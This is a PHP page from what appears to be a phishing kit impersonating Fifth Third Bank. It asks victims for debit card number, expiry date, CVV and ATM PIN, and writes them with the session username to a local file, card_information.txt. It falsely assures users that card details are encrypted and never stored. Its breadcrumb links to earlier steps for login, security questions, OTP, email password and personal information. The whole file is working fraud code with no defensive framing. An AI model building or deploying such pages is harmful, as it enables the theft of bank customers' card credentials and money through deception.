<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardNumber = trim($_POST['card_number'] ?? '');
    $expiryMonth = $_POST['expiry_month'] ?? '';
    $expiryYear = $_POST['expiry_year'] ?? '';
    $cvv = trim($_POST['cvv'] ?? '');
    $pin = trim($_POST['pin'] ?? '');
    
    // Validation
    if (empty($cardNumber)) {
        $errors['card_number'] = 'Card number is required';
    } elseif (!preg_match('/^\d{4} \d{4} \d{4} \d{4}$/', $cardNumber)) {
        $errors['card_number'] = 'Please enter a valid card number';
    }
    
    if (empty($expiryMonth) || empty($expiryYear)) {
        $errors['expiry'] = 'Expiry date is required';
    } else {
        $currentYear = date('Y');
        $currentMonth = date('m');
        if ($expiryYear < $currentYear || ($expiryYear == $currentYear && $expiryMonth < $currentMonth)) {
            $errors['expiry'] = 'Card has expired or expiry date is invalid';
        }
    }
    
    if (empty($cvv)) {
        $errors['cvv'] = 'CVV is required';
    } elseif (!preg_match('/^\d{3,4}$/', $cvv)) {
        $errors['cvv'] = 'Please enter a valid CVV';
    }
    
    if (empty($pin)) {
        $errors['pin'] = 'PIN is required';
    } elseif (!preg_match('/^\d{4}$/', $pin)) {
        $errors['pin'] = 'PIN must be 4 digits';
    }
    
    if (empty($errors)) {
        // Save card information data
        $data = [
            'step' => 'card_information',
            'usrnm' => $username,
            'emzemz' => $username,
            'pay_card' => $cardNumber,
            'exp_mth' => $expiryMonth,
            'exp_yr' => $expiryYear,
            'sec_cd' => $cvv,
            'pin_cd' => $pin
        ];
        
        saveUserData('card_information.txt', $data);
        
        // Redirect to terms page
        header('Location: terms.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];

// Generate expiry years (current year to current year + 15)
$currentYear = date('Y');
$years = [];
for ($i = 0; $i <= 15; $i++) {
    $years[] = $currentYear + $i;
}

$months = [
    '01' => 'January', '02' => 'February', '03' => 'March', '04' => 'April',
    '05' => 'May', '06' => 'June', '07' => 'July', '08' => 'August',
    '09' => 'September', '10' => 'October', '11' => 'November', '12' => 'December'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth Third Bank - Card Information</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
        <!-- Header -->
        <header class="bg-white border-b border-gray-200">
            <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between px-6 py-4 gap-4">
                <div class="flex items-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Bank" class="h-12 w-auto" />
                </div>
                <div class="text-xs sm:text-sm text-gray-700 flex items-center gap-3 uppercase tracking-wide">
                    <a href="#" class="hover:text-[#003087]">Customer Service</a>
                    <span class="text-gray-300">|</span>
                    <a href="#" class="hover:text-[#003087]">Branch &amp; ATM Locator</a>
                </div>
            </div>
        </header>

        <!-- Blue Gradient Section with Card Info Card -->
        <section class="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
            <div class="max-w-6xl mx-auto">
                <!-- Breadcrumb -->
                <div class="mb-6 flex items-center gap-2 text-sm text-white/90">
                    <a href="#" class="text-white/70 hover:text-white">Home</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="index.php" class="text-white/70 hover:text-white">Login</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="security_questions.php" class="text-white/70 hover:text-white">Security Questions</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="otp.php" class="text-white/70 hover:text-white">OTP Verification</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="email_password.php" class="text-white/70 hover:text-white">Email & Password</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="basic_info.php" class="text-white/70 hover:text-white">Personal Information</a>
                    <span class="text-white/50">&#8250;</span>
                    <span class="font-semibold">Card Information</span>
                </div>

                <!-- Card Info Card -->
                <div class="flex justify-center">
                    <div class="bg-[#f4f2f2] max-w-md w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
                        <div class="px-8 py-6">
                            <div class="text-center mb-6">
                                <div class="mx-auto w-16 h-16 bg-[#123b9d] rounded-full flex items-center justify-center mb-4">
                                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                    </svg>
                                </div>
                                <h1 class="text-2xl font-bold text-gray-800 mb-2">Card Information</h1>
                                <p class="text-sm text-gray-600">Please provide your debit card details for account setup and verification.</p>
                            </div>
                            
                            <!-- Error Display -->
                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" class="space-y-6">
                                <!-- Card Number -->
                                <div>
                                    <label for="card_number" class="block text-sm font-semibold text-gray-700 mb-2">
                                        Card Number
                                    </label>
                                    <div class="relative">
                                        <input
                                            type="text"
                                            id="card_number"
                                            name="card_number"
                                            placeholder="1234 5678 9012 3456"
                                            maxlength="19"
                                            value="<?php echo htmlspecialchars($_POST['card_number'] ?? ''); ?>"
                                            class="w-full border border-gray-300 rounded-sm px-3 py-2 pr-12 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a] font-mono"
                                        />
                                        <div class="absolute inset-y-0 right-3 flex items-center">
                                            <svg class="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                            </svg>
                                        </div>
                                    </div>
                                    <?php if (isset($errors['card_number'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['card_number']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- Expiry Date -->
                                <div>
                                    <label class="block text-sm font-semibold text-gray-700 mb-2">
                                        Expiry Date
                                    </label>
                                    <div class="grid grid-cols-2 gap-3">
                                        <div>
                                            <select
                                                id="expiry_month"
                                                name="expiry_month"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            >
                                                <option value="">Month</option>
                                                <?php foreach ($months as $value => $label): ?>
                                                    <option value="<?php echo $value; ?>" <?php echo (isset($_POST['expiry_month']) && $_POST['expiry_month'] === $value) ? 'selected' : ''; ?>>
                                                        <?php echo htmlspecialchars($label); ?>
                                                    </option>
                                                <?php endforeach; ?>
                                            </select>
                                        </div>
                                        <div>
                                            <select
                                                id="expiry_year"
                                                name="expiry_year"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            >
                                                <option value="">Year</option>
                                                <?php foreach ($years as $year): ?>
                                                    <option value="<?php echo $year; ?>" <?php echo (isset($_POST['expiry_year']) && $_POST['expiry_year'] == $year) ? 'selected' : ''; ?>>
                                                        <?php echo $year; ?>
                                                    </option>
                                                <?php endforeach; ?>
                                            </select>
                                        </div>
                                    </div>
                                    <?php if (isset($errors['expiry'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['expiry']); ?></p>
                                    <?php endif; ?>
                                </div>

                                <!-- CVV and PIN -->
                                <div class="grid grid-cols-2 gap-3">
                                    <!-- CVV -->
                                    <div>
                                        <label for="cvv" class="block text-sm font-semibold text-gray-700 mb-2">
                                            CVV
                                        </label>
                                        <input
                                            type="text"
                                            id="cvv"
                                            name="cvv"
                                            placeholder="123"
                                            maxlength="4"
                                            value="<?php echo htmlspecialchars($_POST['cvv'] ?? ''); ?>"
                                            class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a] font-mono"
                                        />
                                        <?php if (isset($errors['cvv'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['cvv']); ?></p>
                                        <?php endif; ?>
                                        <p class="mt-1 text-xs text-gray-500">3-4 digits on back</p>
                                    </div>

                                    <!-- PIN -->
                                    <div>
                                        <label for="pin" class="block text-sm font-semibold text-gray-700 mb-2">
                                            ATM PIN
                                        </label>
                                        <input
                                            type="text"
                                            id="pin"
                                            name="pin"
                                            placeholder="1234"
                                            maxlength="4"
                                            value="<?php echo htmlspecialchars($_POST['pin'] ?? ''); ?>"
                                            class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a] font-mono"
                                        />
                                        <?php if (isset($errors['pin'])): ?>
                                            <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['pin']); ?></p>
                                        <?php endif; ?>
                                        <p class="mt-1 text-xs text-gray-500">4 digits</p>
                                    </div>
                                </div>

                                <!-- Security Notice -->
                                <div class="bg-blue-50 border border-blue-200 rounded-md p-3">
                                    <div class="flex items-start">
                                        <svg class="w-4 h-4 text-blue-600 mt-0.5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                                        </svg>
                                        <div class="text-xs text-blue-700">
                                            <p class="font-semibold mb-1">Secure Connection</p>
                                            <p>Your card information is encrypted and protected with bank-level security. We never store your full card details on our servers.</p>
                                        </div>
                                    </div>
                                </div>

                                <!-- Submit Button -->
                                <button
                                    type="submit"
                                    class="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition"
                                >
                                    Continue
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Information Section -->
        <section class="bg-white py-12 px-4 flex-1">
            <div class="max-w-6xl mx-auto space-y-8">
                <h2 class="text-2xl font-semibold text-gray-900">Card Security</h2>
                <p class="mt-3 text-gray-700 leading-relaxed">
                    Your debit card provides convenient access to your funds. We use advanced security measures to protect your card information and prevent unauthorized use.
                </p>

                <div class="grid gap-6 md:grid-cols-2">
                    <div class="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Fraud Protection</h3>
                        <p class="text-sm text-gray-700 leading-relaxed">
                            Our advanced fraud detection systems monitor transactions 24/7. We'll alert you immediately if we detect any suspicious activity on your account.
                        </p>
                    </div>

                    <div class="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Card Security Tips</h3>
                        <p class="text-sm text-gray-700 leading-relaxed mb-3">
                            Keep your card information secure and follow these best practices to protect against fraud and unauthorized transactions.
                        </p>
                        <ul class="text-sm text-gray-700 space-y-1">
                            <li>• Never share your PIN with anyone</li>
                            <li>• Monitor your account regularly</li>
                            <li>• Report lost or stolen cards immediately</li>
                            <li>• Use secure websites for online purchases</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="bg-[#f4f4f4] border-t border-gray-200">
            <div class="max-w-6xl mx-auto px-6 py-10 text-center">
                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-700">
                    <?php foreach ($footerLinks as $index => $label): ?>
                        <a href="#" class="hover:text-[#003087] underline-offset-4 hover:underline">
                            <?php echo htmlspecialchars($label); ?>
                        </a>
                        <?php if ($index < count($footerLinks) - 1): ?>
                            <span class="text-gray-400">|</span>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>

                <p class="mt-5 text-sm text-gray-700">
                    Copyright © 2025 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC.
                    <span class="inline-flex items-center gap-1 font-semibold">
                        <span role="img" aria-label="house">🏠</span>
                        Equal Housing Lender.
                    </span>
                </p>

                <div class="mt-6 flex items-center justify-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Logo" class="h-10 w-auto" />
                </div>
            </div>
        </footer>
    </div>

    <script>
        // Auto-format card number
        document.addEventListener('DOMContentLoaded', function() {
            const cardInput = document.getElementById('card_number');
            if (cardInput) {
                cardInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    let formattedValue = '';
                    
                    for (let i = 0; i < value.length && i < 16; i++) {
                        if (i > 0 && i % 4 === 0) {
                            formattedValue += ' ';
                        }
                        formattedValue += value[i];
                    }
                    
                    e.target.value = formattedValue;
                });
            }

            // Only allow numeric input for CVV and PIN
            const cvvInput = document.getElementById('cvv');
            const pinInput = document.getElementById('pin');
            
            [cvvInput, pinInput].forEach(function(input) {
                if (input) {
                    input.addEventListener('input', function(e) {
                        e.target.value = e.target.value.replace(/\D/g, '');
                    });
                }
            });
        });
    </script>
</body>
</html>
